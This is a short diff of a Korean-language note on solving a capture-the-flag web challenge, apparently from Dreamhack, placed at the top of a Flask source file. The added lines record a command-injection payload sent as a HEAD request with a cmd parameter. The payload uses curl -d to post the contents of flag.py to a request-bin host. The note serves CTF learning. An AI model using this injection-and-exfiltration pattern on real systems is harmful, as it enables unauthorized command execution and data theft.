@@ -6,6 +6,9 @@ solution..!
 - 그래서 HEAD를 통해 다른 쪽으로 요청하거나 하는 방식으로..?
 1안) curl를 이용해서 데이터를 준다?? -> 근데 이게 어디 있는줄ㅇ ㅏㄹ고
 2안) vi를 통해 파일을 생성한다?? -> 풀 명령어를 모름..
+- curl을 사용하는건 맞고 데이터를 줄떄 curl의 -d option을 사용
+    - HEAD http://host3.dreamhack.games:14162/?cmd=curl https://khunioz.request.dreamhack.games/ -d "$(cat flag.py)"
+    - dreamhack tools을 사용했음
 '''
 #!/usr/bin/env python3
 from flask import Flask, request
